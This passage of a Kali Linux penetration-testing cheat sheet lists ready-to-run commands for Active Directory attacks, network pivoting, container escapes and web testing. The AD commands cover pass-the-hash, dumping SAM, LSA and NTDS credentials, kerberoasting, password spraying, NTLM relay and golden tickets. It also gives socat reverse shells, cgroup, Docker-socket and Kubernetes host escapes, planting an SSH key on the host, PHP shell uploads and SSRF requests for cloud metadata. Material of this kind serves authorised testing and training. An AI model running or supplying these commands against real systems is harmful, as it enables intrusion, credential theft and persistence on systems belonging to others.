### ScoutSuite — Multi-Cloud Auditing
```bash
# Install
pip3 install scoutsuite

# AWS audit
scout aws
scout aws --profile pentest-profile

# Azure audit
scout azure --cli

# GCP audit
scout gcp --user-account

# Output
# Results saved to scoutsuite-report/ folder
# Open scoutsuite-report/scoutsuite-results/scoutsuite_report.html
```

### CloudMapper — AWS Visualization
```bash
# Install
git clone https://github.com/duo-labs/cloudmapper.git
cd cloudmapper
pip3 install -r requirements.txt

# Collect data
python3 cloudmapper.py collect --account myaccount

# Prepare and serve
python3 cloudmapper.py prepare --account myaccount
python3 cloudmapper.py webserver

# Report
python3 cloudmapper.py report --account myaccount
```

### Pacu — AWS Exploitation Framework
```bash
# Install
pip3 install pacu

# Run
pacu

# Inside Pacu:
# import_keys --all
# run iam__enum_users_roles_policies_groups
# run s3__enum_buckets
# run ec2__enum
# run iam__privesc_scan
```

---

## 35. ACTIVE DIRECTORY & WINDOWS ATTACKS

### evil-winrm — WinRM Shell
```bash
# Install
gem install evil-winrm

# Connect
evil-winrm -i 192.168.1.100 -u administrator -p password
evil-winrm -i 192.168.1.100 -u administrator -H NTLM_HASH   # pass-the-hash
evil-winrm -i 192.168.1.100 -u administrator -p password -S  # SSL
evil-winrm -i 192.168.1.100 -u administrator -k key.pem -c cert.pem  # certificate

# Inside evil-winrm:
# upload /local/file.txt C:\remote\file.txt
# download C:\remote\file.txt /local/
# menu          (show available functions)
# Invoke-Binary /local/binary.exe
# services
# Get-ChildItem
```

### CrackMapExec (CME/NetExec) — Swiss Army Knife for AD
```bash
# Install
pip3 install crackmapexec
# or use netexec (modern fork): pip3 install netexec

# SMB enumeration
crackmapexec smb 192.168.1.0/24                              # host discovery
crackmapexec smb 192.168.1.100 -u admin -p password         # auth test
crackmapexec smb 192.168.1.100 -u admin -H HASH             # pass-the-hash
crackmapexec smb 192.168.1.100 --shares                      # list shares
crackmapexec smb 192.168.1.100 --users                       # enumerate users
crackmapexec smb 192.168.1.100 --groups                      # enumerate groups
crackmapexec smb 192.168.1.100 --loggedon-users
crackmapexec smb 192.168.1.100 --pass-pol                    # password policy
crackmapexec smb 192.168.1.100 -u admin -p pass -x "whoami" # execute command
crackmapexec smb 192.168.1.100 -u admin -p pass --sam        # dump SAM
crackmapexec smb 192.168.1.100 -u admin -p pass --lsa        # dump LSA
crackmapexec smb 192.168.1.100 -u admin -p pass --ntds       # dump NTDS.dit

# WinRM
crackmapexec winrm 192.168.1.100 -u admin -p password
crackmapexec winrm 192.168.1.100 -u admin -p pass -x "whoami"

# LDAP (AD enumeration)
crackmapexec ldap 192.168.1.100 -u admin -p pass --users
crackmapexec ldap 192.168.1.100 -u admin -p pass --groups
crackmapexec ldap 192.168.1.100 -u admin -p pass --asreproast output.txt
crackmapexec ldap 192.168.1.100 -u admin -p pass --kerberoasting output.txt

# Spray passwords
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt --continue-on-success
crackmapexec smb 192.168.1.100 -u users.txt -p 'Password123!' --continue-on-success
```

### BloodHound — AD Attack Path Visualization
```bash
# Install BloodHound
apt install bloodhound
apt install neo4j

# Start services
neo4j start
bloodhound &
# Default creds: neo4j:neo4j (change on first login)

# Collect data with SharpHound (Windows target)
# On Windows: .\SharpHound.exe -c All

# Collect data with BloodHound.py (from Kali)
pip3 install bloodhound
bloodhound-python -u admin -p password -d domain.local -dc dc01.domain.local -c All
bloodhound-python -u admin -p password -d domain.local -ns 192.168.1.100 -c All --zip

# Import ZIP into BloodHound GUI
# Drag and drop ZIP file into BloodHound

# Useful BloodHound queries (in GUI):
# "Find all Domain Admins"
# "Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Find Computers with Unconstrained Delegation"
# "Kerberoastable Accounts"
```

### Impacket Suite — Windows Protocol Tools
```bash
# Install
pip3 install impacket
# or: apt install python3-impacket

# psexec.py — Remote execution via SMB
impacket-psexec domain/admin:password@192.168.1.100
impacket-psexec -hashes :NTLM_HASH domain/admin@192.168.1.100

# secretsdump.py — Dump credential hashes
impacket-secretsdump domain/admin:password@192.168.1.100
impacket-secretsdump -hashes :HASH domain/admin@192.168.1.100
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL  # offline

# wmiexec.py — Remote execution via WMI
impacket-wmiexec domain/admin:password@192.168.1.100
impacket-wmiexec -hashes :HASH domain/admin@192.168.1.100

# smbexec.py — Remote execution (less noisy)
impacket-smbexec domain/admin:password@192.168.1.100

# GetNPUsers.py — AS-REP Roasting
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.100
impacket-GetNPUsers domain.local/admin:password -request -dc-ip 192.168.1.100

# GetUserSPNs.py — Kerberoasting
impacket-GetUserSPNs domain.local/admin:password -dc-ip 192.168.1.100 -request
impacket-GetUserSPNs domain.local/admin:password -dc-ip 192.168.1.100 -outputfile hashes.txt

# smbclient.py — SMB client
impacket-smbclient domain/admin:password@192.168.1.100

# atexec.py — Task scheduler execution
impacket-atexec domain/admin:password@192.168.1.100 "whoami"

# ntlmrelayx.py — NTLM relay attack
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i  # interactive shell

# lookupsid.py — SID enumeration
impacket-lookupsid domain/guest:@192.168.1.100

# rpcdump.py — RPC endpoint enumeration
impacket-rpcdump 192.168.1.100

# ticketer.py — Golden/Silver ticket
impacket-ticketer -nthash HASH -domain-sid S-1-5-... -domain domain.local -spn cifs/dc01 admin
```

---

## 36. TUNNELING & PIVOTING

### proxychains — Route Traffic Through Proxy
```bash
# Config file
cat /etc/proxychains4.conf
nano /etc/proxychains4.conf

# Add SOCKS5 proxy (e.g. SSH dynamic forward)
# socks5 127.0.0.1 1080
# socks4 127.0.0.1 9050  (Tor)

# Usage — prefix any command
proxychains nmap -sT -Pn 192.168.2.0/24
proxychains curl http://192.168.2.10
proxychains firefox
proxychains msfconsole
proxychains evil-winrm -i 192.168.2.100 -u admin -p password

# Dynamic SOCKS proxy via SSH
ssh -D 1080 -N -f user@pivot-host          # create SOCKS5 on port 1080
ssh -D 9050 -N -f user@pivot-host          # use with Tor-style setup
```

### chisel — Fast TCP/UDP Tunneling
```bash
# Install
apt install chisel
# or: go install github.com/jpillora/chisel@latest

# Server (on attacker machine)
chisel server --port 8080 --reverse          # reverse tunnel server
chisel server --port 8080 --reverse --auth user:pass

# Client (on pivot/victim)
chisel client 192.168.1.100:8080 R:socks    # reverse SOCKS5 (use with proxychains)
chisel client 192.168.1.100:8080 R:1080:socks
chisel client 192.168.1.100:8080 R:4444:192.168.2.50:4444  # port forward
chisel client 192.168.1.100:8080 9090:192.168.2.10:80      # local forward

# After: set proxychains to socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.2.0/24
```

### ligolo-ng — Advanced Tunneling
```bash
# Install
apt install ligolo-ng
# or download from: github.com/nicocha30/ligolo-ng

# On attacker — start proxy
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# On victim — connect agent
./agent -connect 192.168.1.100:11601 -ignore-cert

# In ligolo-ng console:
# session                    (list sessions)
# [0] >>  start              (start tunnel)
# On attacker — add route:
sudo ip route add 192.168.2.0/24 dev ligolo

# Now reach internal network directly
nmap -sV 192.168.2.10
```

### socat — Multipurpose Relay
```bash
# Install
apt install socat

# Port forward (listen on 8080, forward to 192.168.2.10:80)
socat TCP-LISTEN:8080,fork TCP:192.168.2.10:80

# Reverse shell listener
socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash

# Reverse shell from victim
socat TCP:192.168.1.100:4444 EXEC:/bin/bash

# Encrypted reverse shell (SSL)
# Attacker:
socat OPENSSL-LISTEN:4444,cert=cert.pem,key=key.pem,verify=0 STDOUT
# Victim:
socat OPENSSL:192.168.1.100:4444,verify=0 EXEC:/bin/bash

# File transfer
# Sender:
socat -u FILE:file.txt TCP-LISTEN:5555
# Receiver:
socat -u TCP:192.168.1.100:5555 FILE:received.txt

# UDP tunnel
socat UDP-LISTEN:5353,fork UDP:8.8.8.8:53

# Serial to TCP
socat TCP-LISTEN:5000,fork FILE:/dev/ttyS0,b9600
```

### SSH Tunneling
```bash
# Local port forward (access remote service locally)
ssh -L 8080:192.168.2.10:80 user@pivot           # browse localhost:8080 → internal:80
ssh -L 3389:192.168.2.20:3389 user@pivot         # RDP to internal host

# Remote port forward (expose local service on remote)
ssh -R 4444:localhost:4444 user@pivot            # forward pivot:4444 → attacker:4444

# Dynamic SOCKS5 proxy
ssh -D 1080 -N -f user@pivot                     # create SOCKS5 proxy

# Multi-hop tunneling
ssh -L 8080:192.168.3.10:80 user@pivot1 -o ProxyJump=user@pivot2

# Keep alive
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -N -f -L 8080:target:80 user@pivot
```

### SSHuttle — Transparent VPN over SSH
```bash
# Install
apt install sshuttle

# Route all traffic through pivot
sshuttle -r user@pivot 192.168.2.0/24
sshuttle -r user@pivot 0.0.0.0/0 --dns          # all traffic including DNS
sshuttle -r user@pivot 192.168.2.0/24 --ssh-cmd "ssh -i key.pem"
```

---

## 37. CONTAINER ESCAPE TECHNIQUES

> ⚠️ **For authorized penetration testing and CTF environments only.**

### Reconnaissance Inside Container
```bash
# Check if inside a container
cat /proc/1/cgroup | grep docker
ls /.dockerenv                       # file exists = Docker container
cat /proc/self/status | grep CapEff  # check capabilities
env | grep -i kube                   # Kubernetes environment?
mount | grep overlay                 # overlay filesystem = container

# Check capabilities
capsh --print
getpcaps $$

# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged
python3 -c "import subprocess; print(subprocess.check_output(['capsh','--print']).decode())"
```

### Privileged Container Escape
```bash
# If container is --privileged, mount host filesystem
fdisk -l                             # list host disks
mkdir /mnt/host
mount /dev/sda1 /mnt/host            # mount host root
chroot /mnt/host                     # chroot into host
# Now you're on the host!

# Add SSH key to host
echo "ssh-rsa AAAA..." >> /mnt/host/root/.ssh/authorized_keys

# Cgroup escape (privileged)
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

### Docker Socket Escape
```bash
# Check for Docker socket mounted inside container
ls -la /var/run/docker.sock          # if present, game over
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Escape via Docker socket
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
# Or using curl:
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}' \
  http://localhost/containers/create
```

### deepce — Docker Enumeration & Escape
```bash
# Install / run
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
chmod +x deepce.sh
./deepce.sh                          # full scan
./deepce.sh --no-enumeration         # skip enumeration
./deepce.sh -e DOCKER                # check Docker escapes only

# What it checks:
# - Privileged mode
# - Mounted Docker socket
# - Sensitive mounts (/etc, /root, /proc)
# - Dangerous capabilities (SYS_ADMIN, SYS_PTRACE)
# - Kubernetes service account tokens
# - Writable host paths
```

### Kubernetes Escapes
```bash
# Check for K8s service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token to query K8s API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods

# Check RBAC permissions
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'

# If can create pods — mount host filesystem
kubectl --token=$TOKEN run escape --image=alpine --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"escape","image":"alpine","command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","bash"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}' -it
```

---

## 38. GIT — VERSION CONTROL

### Setup
```bash
git --version
git config --global user.name "YourName"
git config --global user.email "you@example.com"
git config --global core.editor vim
git config --list                    # show all config
```

### Repository Basics
```bash
git init                             # initialize new repo
git init myproject                   # init in new folder
git clone https://github.com/user/repo.git
git clone https://github.com/user/repo.git mydir  # clone to folder
git clone --depth 1 https://github.com/user/repo.git  # shallow clone
git status                           # show working tree status
git log                              # commit history
git log --oneline                    # compact log
git log --oneline --graph --all      # visual branch graph
git log --author="name"
git log --since="2 weeks ago"
git diff                             # unstaged changes
git diff --staged                    # staged changes
git show HEAD                        # show last commit
```

### Staging & Committing
```bash
git add file.txt                     # stage file
git add .                            # stage all changes
git add -p                           # interactive staging (hunk by hunk)
git commit -m "commit message"
git commit -am "message"             # stage + commit tracked files
git commit --amend                   # edit last commit
git commit --amend --no-edit         # amend without changing message
```

### Branches
```bash
git branch                           # list branches
git branch -a                        # all branches (including remote)
git branch feature-x                 # create branch
git checkout feature-x               # switch branch
git checkout -b feature-x            # create and switch
git switch feature-x                 # modern switch syntax
git switch -c feature-x              # create and switch (modern)
git merge feature-x                  # merge branch into current
git merge --no-ff feature-x          # merge with merge commit
git branch -d feature-x              # delete branch (safe)
git branch -D feature-x              # force delete
git rebase main                      # rebase current onto main
```

### Remote Repositories
```bash
git remote -v                        # show remotes
git remote add origin https://github.com/user/repo.git
git remote remove origin
git remote rename origin upstream
git push origin main                 # push to remote
git push -u origin main              # push + set upstream
git push --force                     # force push (dangerous)
git pull                             # fetch + merge
git pull --rebase                    # fetch + rebase
git fetch origin                     # fetch without merge
git fetch --all
```

### Undoing Changes
```bash
git restore file.txt                 # discard unstaged changes
git restore --staged file.txt        # unstage file
git reset HEAD file.txt              # unstage (older syntax)
git reset --soft HEAD~1              # undo last commit (keep staged)
git reset --mixed HEAD~1             # undo last commit (keep unstaged)
git reset --hard HEAD~1              # undo last commit (discard changes)
git revert HEAD                      # create revert commit (safe)
git clean -fd                        # remove untracked files + dirs
git stash                            # stash changes
git stash pop                        # apply stash
git stash list                       # list stashes
git stash drop stash@{0}
```

### Tags
```bash
git tag                              # list tags
git tag v1.0                         # lightweight tag
git tag -a v1.0 -m "Release v1.0"   # annotated tag
git push origin v1.0                 # push tag
git push origin --tags               # push all tags
git tag -d v1.0                      # delete local tag
git push origin --delete v1.0        # delete remote tag
```

### Git for Pentesting
```bash
# Clone pentest tool repos
git clone https://github.com/carlospolop/PEASS-ng.git
git clone https://github.com/danielmiessler/SecLists.git
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
git clone https://github.com/PowerShellMafia/PowerSploit.git
git clone https://github.com/byt3bl33d3r/CrackMapExec.git

# Keep tools updated
cd /opt/PEASS-ng && git pull
cd /opt/SecLists && git pull

# Search commit history for secrets (trufflehog / gitleaks)
trufflehog git https://github.com/org/repo
gitleaks detect --source . -v

# Search for secrets in git log
git log -p | grep -i "password\|secret\|token\|api_key"
git log --all --full-history -- "*.env"

# Dump all files from a git repo (even deleted)
git log --all --oneline
git show <commit>:path/to/file
```

---

## 39. CURL & WGET — ADVANCED USAGE

### curl — Advanced HTTP Client
```bash
# Basic requests
curl http://target.com                          # GET
curl -I http://target.com                       # HEAD only (headers)
curl -v http://target.com                       # verbose (shows headers)
curl -s http://target.com                       # silent (no progress)
curl -o output.html http://target.com           # save to file
curl -O http://target.com/file.zip             # save with original name
curl -L http://target.com                       # follow redirects
curl -k https://target.com                      # ignore SSL errors

# HTTP Methods
curl -X POST http://target.com/api
curl -X PUT http://target.com/api/1
curl -X DELETE http://target.com/api/1
curl -X PATCH http://target.com/api/1
curl -X OPTIONS http://target.com               # check allowed methods

# Custom Headers
curl -H "Authorization: Bearer TOKEN" http://target.com
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
curl -H "Content-Type: application/json" http://target.com
curl -H "Host: internal.target.com" http://target.com
curl -A "Mozilla/5.0 (custom UA)" http://target.com  # User-Agent
curl -H "Referer: http://trusted.com" http://target.com

# POST Data
curl -d "user=admin&pass=password" http://target.com/login    # form data
curl -d '{"user":"admin","pass":"password"}' -H "Content-Type: application/json" http://target.com/api
curl -F "file=@shell.php" http://target.com/upload             # file upload
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload  # spoof MIME type

# Authentication
curl -u admin:password http://target.com        # Basic auth
curl -u admin:password --digest http://target.com  # Digest auth

# Cookies
curl -c cookies.txt http://target.com           # save cookies
curl -b cookies.txt http://target.com           # send cookies
curl -b "session=abc123; role=admin" http://target.com
curl -c cookies.txt -b cookies.txt -L http://target.com/login -d "user=admin&pass=pass"

# Proxies
curl -x http://127.0.0.1:8080 http://target.com     # HTTP proxy (Burp)
curl --socks5 127.0.0.1:1080 http://target.com       # SOCKS5 proxy
curl --socks5-hostname 127.0.0.1:9050 http://target.onion  # Tor

# SSL/TLS
curl -k https://target.com                       # ignore cert errors
curl --cert client.crt --key client.key https://target.com  # client cert
curl --cacert ca.crt https://target.com          # custom CA

# API Testing
curl http://target.com/api/v1/users              # list users
curl http://target.com/api/v1/users/1            # get user
curl -X POST -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin"}' \
  http://target.com/api/v1/users                 # create user
curl -X PUT -H "Authorization: Bearer TOKEN" \
  -d '{"role":"admin"}' \
  http://target.com/api/v1/users/2               # update (privesc test)

# SSRF Testing
curl -v "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -v "http://target.com/fetch?url=file:///etc/passwd"
curl -v "http://target.com/fetch?url=http://localhost:8080/admin"

# Timing & Rate
curl --max-time 10 http://target.com             # timeout
curl --connect-timeout 5 http://target.com
curl --retry 3 http://target.com

# Useful combinations
# Check if CORS misconfigured
curl -H "Origin: https://evil.com" -I http://target.com
# Check clickjacking header
curl -I http://target.com | grep -i "x-frame\|x-content\|strict-transport"
# Check HTTP methods
curl -X OPTIONS -v http://target.com 2>&1 | grep Allow

# Download file with progress
curl -# -O http://target.com/bigfile.zip
# Resume download
curl -C - -O http://target.com/bigfile.zip
```

### wget — File Retrieval
```bash
# Basic
wget http://target.com/file.zip
wget -O output.zip http://target.com/file.zip    # rename output
wget -q http://target.com/file.zip               # quiet
wget -c http://target.com/file.zip               # continue interrupted
wget -b http://target.com/file.zip               # background

# Mirror / Spider
wget -r http://target.com                        # recursive download
wget -r -l 3 http://target.com                   # limit depth to 3
wget --mirror -p --convert-links http://target.com  # full mirror
wget -r -A "*.pdf,*.docx" http://target.com      # download only PDFs
wget -r --no-parent http://target.com/files/     # don't go up

# Headers & Auth
wget --header="Authorization: Bearer TOKEN" http://target.com
wget --user=admin --password=password http://target.com
wget --http-user=admin --http-password=password http://target.com/protected/

# Cookies
wget --save-cookies cookies.txt http://target.com
wget --load-cookies cookies.txt http://target.com/protected/

# Proxy
wget -e use_proxy=yes -e http_proxy=http://127.0.0.1:8080 http://target.com

# No certificate check
wget --no-check-certificate https://target.com

# Spider only (no download)
wget --spider -r http://target.com 2>&1 | grep -i "200\|301\|403\|404"

# Download list of files
wget -i urls.txt

# User-Agent
wget --user-agent="Mozilla/5.0" http://target.com

# Rate limiting
wget --limit-rate=100k http://target.com/bigfile.zip

# Combine for reconnaissance
wget -r --spider -nd --no-parent -H -D target.com http://target.com 2>&1 | grep "http" | awk '{print $3}' | sort -u
```

---

## 40. TMUX & SCREEN — FULL CHEAT SHEET

### tmux — Terminal Multiplexer

> Default prefix key: **Ctrl+B**

```bash
# Starting tmux
tmux                                 # new session
tmux new -s mysession                # named session
tmux new -s pentest -d               # detached session
tmux ls                              # list sessions
tmux attach -t mysession             # attach to session
tmux attach -t 0                     # attach by number
tmux kill-session -t mysession       # kill session
tmux kill-server                     # kill all sessions
```

#### tmux Key Bindings (prefix = Ctrl+B)
```
SESSION MANAGEMENT:
  Prefix + d          Detach from session
  Prefix + s          List & switch sessions
  Prefix + $          Rename session
  Prefix + (          Previous session
  Prefix + )          Next session

WINDOWS (tabs):
  Prefix + c          Create new window
  Prefix + ,          Rename window
  Prefix + w          List & choose window
  Prefix + n          Next window
  Prefix + p          Previous window
  Prefix + &          Kill window
  Prefix + 0-9        Switch to window by number
  Prefix + l          Last (previously used) window

PANES (splits):
  Prefix + %          Split vertically (side by side)
  Prefix + "          Split horizontally (top/bottom)
  Prefix + Arrow      Navigate panes
  Prefix + o          Cycle through panes
  Prefix + ;          Last active pane
  Prefix + x          Kill pane
  Prefix + z          Zoom/unzoom pane (fullscreen)
  Prefix + {          Move pane left
  Prefix + }          Move pane right
  Prefix + q          Show pane numbers (then press number)
  Prefix + !          Break pane into new window
  Prefix + Space      Toggle pane layouts

COPY MODE:
  Prefix + [          Enter copy mode
  q                   Quit copy mode
  /                   Search forward
  ?                   Search backward
  Space               Start selection
  Enter               Copy selection
  Prefix + ]          Paste

MISC:
  Prefix + :          Enter command mode
  Prefix + ?          Show all key bindings
  Prefix + t          Show clock
  Prefix + r          Reload config (if set up)
```

#### tmux Config (~/.tmux.conf)
```bash
# Change prefix to Ctrl+A (screen-style)
set -g prefix C-a
unbind C-b
bind C-a send-prefix

# Mouse support
set -g mouse on

# Start window/pane index at 1
set -g base-index 1
setw -g pane-base-index 1

# Easy reload
bind r source-file ~/.tmux.conf \; display "Reloaded!"

# Vim-style pane navigation
bind h select-pane -L
bind j select-pane -D
bind k select-pane -U
bind l select-pane -R

# Better split bindings
bind | split-window -h -c "#{pane_current_path}"
bind - split-window -v -c "#{pane_current_path}"

# Status bar color
set -g status-bg colour235
set -g status-fg colour136
```

### screen — Terminal Multiplexer

> Default prefix key: **Ctrl+A**

```bash
# Starting screen
screen                               # new session
screen -S mysession                  # named session
screen -ls                           # list sessions
screen -r mysession                  # reattach
screen -r 1234                       # reattach by PID
screen -d -r mysession               # detach & reattach
screen -X -S mysession quit          # kill session
screen -wipe                         # remove dead sessions
```

#### screen Key Bindings (prefix = Ctrl+A)
```
SESSION:
  Ctrl+A d            Detach from session
  Ctrl+A D D          Detach and logout
  Ctrl+A :quit        Kill session (command mode)

WINDOWS:
  Ctrl+A c            Create new window
  Ctrl+A A            Rename window
  Ctrl+A "            List windows (choose)
  Ctrl+A n            Next window
  Ctrl+A p            Previous window
  Ctrl+A 0-9          Switch to window by number
  Ctrl+A k            Kill current window
  Ctrl+A l            Redraw screen
  Ctrl+A w            Show window list in status bar

SPLIT REGIONS:
  Ctrl+A S            Split horizontally
  Ctrl+A |            Split vertically
  Ctrl+A Tab          Move to next region
  Ctrl+A X            Remove current region
  Ctrl+A Q            Remove all regions except current

COPY/SCROLL:
  Ctrl+A [            Enter copy/scroll mode
  Space               Start / end selection
  Enter               Copy selection
  Ctrl+A ]            Paste
  Ctrl+A Esc          Same as Ctrl+A [ (copy mode)

MISC:
  Ctrl+A ?            Show key bindings help
  Ctrl+A :            Command mode
  Ctrl+A H            Log output to file
  Ctrl+A M            Monitor window for activity
```

#### screen Config (~/.screenrc)
```bash
# Remove startup message
startup_message off

# Enable scrollback
defscrollback 10000

# Status bar
hardstatus alwayslastline
hardstatus string '%{= kG}[ %{G}%H %{g}][%= %{= kw}%?%-Lw%?%{r}(%{W}%n*%f%t%?(%u)%?%{r})%{w}%?%+Lw%?%?%= %{g}][%{B} %d/%m %{W}%c %{g}]'

# Change escape key to Ctrl+Z (optional)
# escape ^Zz

# UTF-8
defutf8 on

# Vim-style
bindkey -d -k k1 select 0
```

---

## QUICK REFERENCE CHEAT SHEET

```
RECON:          nmap, masscan, theHarvester, amass, subfinder, shodan
WEB:            nikto, gobuster, ffuf, sqlmap, wpscan, burpsuite, nuclei
PASSWORDS:      hydra, hashcat, john, medusa, crunch, cewl
WIRELESS:       aircrack-ng, wifite, reaver, hcxdumptool
EXPLOITATION:   msfconsole, msfvenom, searchsploit, sqlmap
POST-EXPLOIT:   meterpreter, linpeas, mimikatz
SNIFFING:       tcpdump, wireshark, bettercap, responder, ettercap
FORENSICS:      autopsy, volatility, binwalk, foremost, exiftool
CRYPTO:         openssl, hashcat, john, gpg, steghide
REVERSE ENG:    gdb, radare2, ghidra, objdump, strings
DOCKER:         docker, docker-compose, deepce
CLOUD:          aws, az, gcloud, scoutsuite, cloudmapper, pacu
AD/WINDOWS:     evil-winrm, crackmapexec, bloodhound, impacket
TUNNELING:      chisel, ligolo-ng, proxychains, socat, sshuttle
PYTHON:         requests, socket, subprocess, base64, hashlib
GIT:            git, trufflehog, gitleaks
```

---

*Document compiled for Kali Linux — Educational & Authorized Testing Purposes Only*
*Always ensure you have explicit written permission before testing any system*

